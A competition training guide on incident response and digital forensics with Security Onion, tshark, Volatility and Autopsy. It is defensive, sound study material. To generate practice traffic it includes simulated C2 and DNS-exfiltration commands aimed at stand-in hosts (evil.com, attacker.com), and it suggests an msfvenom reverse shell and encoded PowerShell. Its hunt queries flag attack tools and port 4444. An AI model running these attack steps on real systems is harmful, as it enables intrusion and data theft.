# 40 — Day 2 (Stage B) — Incident Response & Digital Forensics with Security Onion

**What this file covers:** how to use **Security Onion** to do **digital-forensics + incident-response (IR) work** during Day 2 of the competition.

**Marks at stake:** **Criterion B1 — "HO Flags" — about 13 K-marks.** These are forensics-style flags hidden in PCAPs, logs, and disk images. You earn marks by FINDING the flag (e.g., a leaked password, an attacker's IP, a malware filename). Each flag has H1 + H2 hint bonuses for solving without help.

**Skill level assumed:** none. We treat each tool like the first time you've seen it.

**Time:** ~2 hours per practice run after Stage A is built. Repeat 3+ times.

---

## What is "incident response" and "digital forensics"? (read once)

Imagine someone broke into a building. **Incident response** = "stop the bleeding" — kick them out, lock the door, count what's missing. **Digital forensics** = "the detectives" — figure out HOW they got in, WHAT they took, WHO they are.

In a competition CTF context, the organisers stage an attack scenario. Your job:

1. **Find evidence the attack happened** (alerts, logs, PCAPs).
2. **Reconstruct what the attacker did** (timeline of events).
3. **Extract the flags** (specific evidence the markers want — usually a string in `flag{...}` format).

You do this entirely inside **Security Onion's web UI** + **Wireshark** + a few Linux tools.

---

## Tools you'll use today

| Tool | What it does | Where it lives |
|---|---|---|
| **Hunt** (in SO) | Search engine for alerts + logs | SO web UI top menu |
| **Dashboards** (in SO) | Pre-built charts (top hosts, top URLs, etc.) | SO web UI top menu |
| **CyberChef** (in SO) | Decode/encode/decrypt strings (Base64, hex, ROT13, etc.) | SO web UI top menu — opens in new tab |
| **Cases** (in SO) | Investigation notebook — track findings, attach evidence | SO web UI top menu |
| **PCAP / Wireshark** | View raw packets from any flow | Click PCAP icon in Hunt → opens Stenographer or downloads .pcap |
| **Kibana** | Power-user dashboards + queries | SO web UI top menu |
| **strings** (Linux CLI) | Pull readable text out of any file | Kali or Client1 with WSL |
| **xxd / hexdump** | View raw bytes of a file | Kali |
| **base64 / openssl** | Decode encoded blobs | Kali |

---

## Pre-flight — start every practice run from this state

Every Day 2 practice run, do this **first** (5 min):

### 1. Restore SO snapshot

ESXi UI → SecOnion → Snapshots → **Revert to `Stage-A-Complete`**. This wipes any previous run's alerts.

### 2. Boot all required VMs
- pfSense ✓
- WINSRV1 ✓
- LinSRV1 ✓
- Client1 ✓
- SecOnion ✓
- ISP ✓

### 3. Verify SO is alive

PC1 browser → `https://192.168.2.20` → log in as `analyst@manila.com`.

### 4. Generate a test alert

To make sure capture is working, on Client1:
```cmd
nslookup test.malware.com 192.168.2.10
```

Within 30 sec, in SO Hunt → set time range "Last 5 min" → search `dns.query.name:*malware*` → you should see a hit.

If yes: **you're ready**. If no: SO isn't capturing — check eth1 in PG-MIRROR.

---

## The 5-step IR/forensics methodology (memorise this)

Every CTF-style forensics challenge breaks down into the same 5 steps:

| Step | Question | Tool to use |
|---|---|---|
| **1. Triage** | "Is something actually wrong, or just noise?" | Alerts panel in SO |
| **2. Scope** | "How big is the problem? How many hosts? Time range?" | Hunt + Dashboards |
| **3. Timeline** | "What happened in what order?" | Hunt sorted by `@timestamp` |
| **4. Pivot** | "Who else talked to that bad IP / domain / hash?" | Kibana queries |
| **5. Extract** | "What's the flag / evidence?" | PCAP + Wireshark + CyberChef |

If you ever feel lost: **you're between steps**. Stop, write down what you know, find the next step.

---

## Walkthrough 1 — Spot a suspicious domain (beginner — practice)

This is a guided practice scenario. You'll do it the **first time** as training, then redo it under time pressure.

### Setup the scenario (1 min)

On Client1, simulate a bad guy:
```cmd
curl -k https://malware-c2-server.evil.com
```
(That domain doesn't exist — but the DNS query will be logged and possibly flagged.)

### Step 1 — Triage (60 sec)

1. Open SO web UI → **Alerts**.
2. Time range: "Last 5 minutes".
3. Look at the list — sort by **Severity** (high → low).

**What you're looking for:** alerts with severity `high` or `medium` and `event.dataset:dns` or `event.dataset:tls`.

**Expected:** at least one ETOPEN rule fired on `evil.com` keyword.

### Step 2 — Scope (60 sec)

1. Click the alert to expand it. Note the **source IP** (which Client triggered it).
2. In the search bar: `source.ip:"<that IP>" AND event.dataset:dns`.
3. Time range: "Last 1 hour".

**What this tells you:** every DNS query that one host made in the last hour. Helps you see if there are MORE bad domains being looked up.

### Step 3 — Timeline (60 sec)

1. Click **Hunt** in top menu.
2. Search: `source.ip:"<that IP>"`.
3. Click "@timestamp" column header to sort ascending (oldest first).

**What this tells you:** the order of events. Did the host make 100 DNS queries before connecting? Did it scan the network first? Did it download something?

### Step 4 — Pivot (60 sec)

1. From the bad domain, search: `dns.query.name:"malware-c2-server.evil.com"`.
2. **Note all source IPs** that asked about it. Are there other infected hosts?

### Step 5 — Extract (varies)

If the challenge is "what malware family is this?" — open the PCAP for that flow:
1. In Hunt, find the alert row → click the **PCAP** icon.
2. Wireshark opens (or downloads `.pcap`).
3. Apply filter: `dns.qry.name contains "evil"`.
4. Look at the User-Agent or HTTP body — it might literally say `flag{...}`.

> 💡 **In real CTF challenges**, the flag is often hidden in a less obvious place: a TXT DNS record, a base64-encoded HTTP cookie, an unusual user-agent string. Step 5 = creative search.

### What you practised

✅ Read alerts, ranked by severity
✅ Pivoted from alert → host → all activity for that host
✅ Built a timeline
✅ Extracted evidence from a PCAP

That's the loop you'll do for every Day 2 forensics flag.

---

## Walkthrough 2 — PCAP analysis from scratch (intermediate)

This simulates the most common Day 2 challenge: **"Here's a 50 MB PCAP file. Find the flag."**

### Setup

The challenge file `incident.pcap` would be provided by organisers. For practice, download a sample:
- `https://malware-traffic-analysis.net` → "Training Exercises" → pick any "Pcap of the day" zip.
- OR use `wireshark/test/captures/` from a Wireshark install (small samples).

Save as `~/practice/incident.pcap` on Kali.

### Step 1 — High-level summary (3 min)

```bash
# What's in the PCAP?
capinfos incident.pcap
```

Tells you: number of packets, time span, average packet size. Roughly: small = config issue; huge = data exfil or scan.

```bash
# Top talkers — who's chatty?
tshark -r incident.pcap -q -z conv,ip | head -20
```

Tells you: which IP pairs traded the most data. Anomalies → suspicious.

### Step 2 — Protocol breakdown (2 min)

```bash
tshark -r incident.pcap -q -z io,phs | head -40
```

What protocols dominate? Lots of HTTP? Lots of DNS? Lots of SMB? **Whatever's unusual is the lead.**

### Step 3 — Extract files (5 min)

If there's HTTP, attackers often download payloads:
```bash
mkdir extracted && cd extracted
tshark -r ../incident.pcap --export-objects http,. -Y "http"
ls -la
```

Every file the attacker downloaded over HTTP is now in this folder. Run:
```bash
file *
```

To see what each is (PE executable? PDF? ZIP?).

```bash
strings * | grep -iE "flag|password|key|http"
```

You may immediately spot the flag string here.

### Step 4 — DNS exfil check (3 min)

Bad guys hide data in DNS subdomains. Check:
```bash
tshark -r incident.pcap -Y "dns.qry.name" -T fields -e dns.qry.name | sort -u | head -50
```

Look for unusually long subdomains or weird encoding (base64 / hex strings as part of subdomain).

### Step 5 — TLS handshake servers (2 min)

```bash
tshark -r incident.pcap -Y "tls.handshake.type==1" -T fields -e tls.handshake.extensions_server_name | sort -u
```

Lists all SNI values (the domain in the TLS handshake). Look for sketchy ones.

### Step 6 — Open in Wireshark for visual analysis

```bash
wireshark incident.pcap &
```

Useful filters:
- `http.request` — every HTTP request
- `tcp.flags.syn==1 && tcp.flags.ack==0` — every connection attempt (scan?)
- `frame contains "flag{"` — literally search for the flag string in any packet

If you find a packet of interest → right-click → **Follow → TCP Stream**. Reads like a chat log.

---

## Walkthrough 3 — Hunting in Security Onion's Hunt UI (intermediate)

This is the **fastest** way to find Day 2 flags if SO has been capturing the attack as it happens.

### Useful Hunt queries (memorise the top 5)

| Goal | Query |
|---|---|
| All HTTP requests with weird user-agents | `event.dataset:http AND http.user_agent:(*sqlmap* OR *nmap* OR *nikto* OR *curl*)` |
| Failed SSH logins | `event.dataset:ssh AND tags:failure` |
| Any file downloaded in last hour | `event.dataset:files AND files.action:create` |
| Any process running base64 / powershell encoded | `event.dataset:process AND process.command_line:*FromBase64String*` |
| Connections to non-standard ports | `network.transport:tcp AND destination.port:>1024 AND NOT destination.port:(80 OR 443 OR 8080 OR 8443)` |

### Pivot tricks

- See an IP you don't recognize → **right-click → Drilldown** → all activity from that IP.
- See a hash → **right-click → Pivot to VirusTotal** (only works if SO has internet — usually not on competition day).
- See a session-ID / flow-ID → **right-click → PCAP** → opens raw packets.

---

## Walkthrough 4 — Volatility memory forensics (advanced)

If the challenge gives you a memory dump (`.mem` or `.raw` file), use **Volatility 3** (already installed on Kali).

```bash
# Identify the OS profile
vol -f memdump.raw windows.info

# What processes were running?
vol -f memdump.raw windows.pslist

# Network connections?
vol -f memdump.raw windows.netstat

# Suspicious processes (parent-child anomalies)
vol -f memdump.raw windows.pstree

# Strings in memory (where flags often hide)
strings memdump.raw | grep -iE "flag\{|password=|secret"

# Dump a specific process's memory
vol -f memdump.raw windows.dumpfiles --pid <PID>
```

**What you're hunting:** processes that shouldn't be there (e.g., `cmd.exe` spawned by `winword.exe` = malicious macro), unusual network connections, strings hidden in memory.

---

## Walkthrough 5 — Disk forensics with Autopsy (advanced)

If the challenge gives you a disk image (`.E01` or `.dd`), use **Autopsy** (free GUI on Windows or Kali).

1. Install on Kali: `sudo apt install -y autopsy` (already in Kali default).
2. Run: `autopsy &` → opens browser to local web app.
3. Create new case → add disk image → run all default modules.

After analysis (~10 min for small image):
- **Web History** → URLs visited (often a flag is in a Pastebin URL).
- **Recent Files** → what the user opened recently.
- **Deleted files** → recovered.
- **Email** → any email content with a flag string.
- **Keyword search** → search "flag{" → instant hit if any file contains it.

---

## What to write in your investigation notes (the deliverable)

Use SO's **Cases** feature to track findings. For each Day 2 practice flag, fill in:

```
CASE: <flag-id>
ANALYST: <your name>
TIMESTAMP: <when you started>

OBSERVATIONS:
- 14:03 — Alert fired: ET TROJAN evil.com C2 beacon (severity high)
- 14:04 — Source: 172.16.100.5 (Client1)
- 14:05 — Pivoted to host activity, found 12 DNS queries to *.evil.com
- 14:07 — Extracted PCAP, file `payload.exe` downloaded
- 14:10 — strings on payload.exe → flag{m4lw4r3_caught}

CONCLUSION:
Host 172.16.100.5 was infected via drive-by download. Malware downloaded
from evil.com. Flag = flag{m4lw4r3_caught}.

EVIDENCE:
- Alert ID: <UUID>
- PCAP: stored
- File hash: <SHA256>
```

> 💡 **Why this format:** judges may grade not just "did you find the flag" but **how clearly you reconstruct the attack**. Tidy notes = bonus J-marks if there are any judgment-style aspects.

---

## Practice routine — Day 2 IR/Forensics (45 min per session)

After Stage A is done, run this drill 5+ times:

| Time | Activity |
|---|---|
| 0:00–0:05 | Snapshot revert + boot VMs |
| 0:05–0:08 | Pick a practice scenario (sample PCAP + injected attack) |
| 0:08–0:30 | Run the 5-step methodology: triage → scope → timeline → pivot → extract |
| 0:30–0:40 | Write the investigation note in Cases |
| 0:40–0:45 | Compare your flag to "expected answer" — what did you miss? |

Get your time-to-flag down from 30 min → 12 min over 5 practice runs.

---

## Sample practice scenarios (build these locally for repeated drills)

### Scenario A — DNS exfil (15 min target)
On Client1: `nslookup AAAABBBBCCCCDDDD.attacker.com 192.168.2.10` (long encoded subdomain).
**Hunt query to use:** `dns.query.name:*attacker.com*`.
**Flag location:** in the encoded subdomain (decode base32).

### Scenario B — Reverse shell over HTTP (20 min target)
Boot a VulnHub VM with msfvenom-generated reverse shell. Trigger it from Kali.
**Hunt query:** `event.dataset:http AND http.user_agent:*Mozilla* AND destination.port:4444`.
**Flag:** in the C2 traffic in PCAP.

### Scenario C — Suspicious PowerShell (15 min target)
On Client1: paste an encoded PowerShell command (`powershell -enc <base64>`).
**Hunt query:** `process.command_line:*FromBase64String*`.
**Flag:** the decoded payload.

---

## Hint-bonus reminder

The marking scheme gives **bonus K-marks** for solving each flag **without using H1 or H2 hints**. Examples:

| Flag | Base | +No H1 | +No H2 | Total possible |
|---|---|---|---|---|
| HO-01 | 0.84 | 0.21 | 1.04 | 2.09 |
| HO-04 | 0.97 | 0.24 | 1.22 | 2.43 |

**Strategy:** during practice, NEVER use hints. Train your no-hint speed.

During competition: try without hints for 15 min. If totally blocked → take H1 (lose ~0.2 K). If still blocked at 25 min → take H2 (lose ~1 K). If still blocked at 35 min → move on; come back later.

---

## Common forensics pitfalls

| Pitfall | Fix |
|---|---|
| You spend 30 min in Wireshark before opening Hunt | Always start in **Hunt** — it filters down to the suspicious 0.1% |
| You don't note timestamps | Every observation must have UTC time. Without it the timeline is useless |
| You decode every base64 string you see | Most are session cookies. Look for ones tagged in flag-format `flag{` after decode |
| You assume the alert IS the answer | Alerts are starting points, not flags. The flag is usually a few pivots deeper |
| You forget to check ICMP / DNS | Bad guys hide data in tiny channels. Always check those |

---

## Cheat sheet — copy this to your team notes

```
FORENSICS / IR LOOP
─────────────────────
1. Hunt → Alerts (last 1h, sort by severity)
2. Click highest sev → note source IP
3. Drilldown on source IP → see all activity
4. Sort by @timestamp ascending → build timeline
5. Spot the weird thing → click PCAP → Wireshark → "Follow Stream"
6. Look for flag{...} in payload
7. If not in payload → check DNS subdomain encoding, HTTP headers, TLS SNI
8. Decode any base64 / hex with CyberChef
9. Write the case note with timestamps
10. Submit flag

KEY HUNT QUERIES
─────────────────
dns.query.name:*<keyword>*
http.user_agent:*sqlmap*
event.dataset:files AND files.action:create
process.command_line:*FromBase64*
destination.port:4444 OR destination.port:1337

KEY WIRESHARK FILTERS
──────────────────────
http.request
tcp.flags.syn==1 && tcp.flags.ack==0
frame contains "flag{"
dns.qry.name contains "evil"
```

---

## What you've learned by end of this file

✅ How to use Security Onion's Hunt and Alerts
✅ The 5-step IR methodology (Triage → Scope → Timeline → Pivot → Extract)
✅ PCAP analysis from CLI (`capinfos`, `tshark`, `tshark --export-objects`)
✅ Wireshark "Follow Stream" for human-readable conversations
✅ Volatility 3 memory forensics commands
✅ Autopsy disk forensics
✅ How to write an investigation note that scores marks

---

End of file. Next: `41_Day2_MalwareIR.md` — what to do when the evidence is a malicious file (not a packet capture).
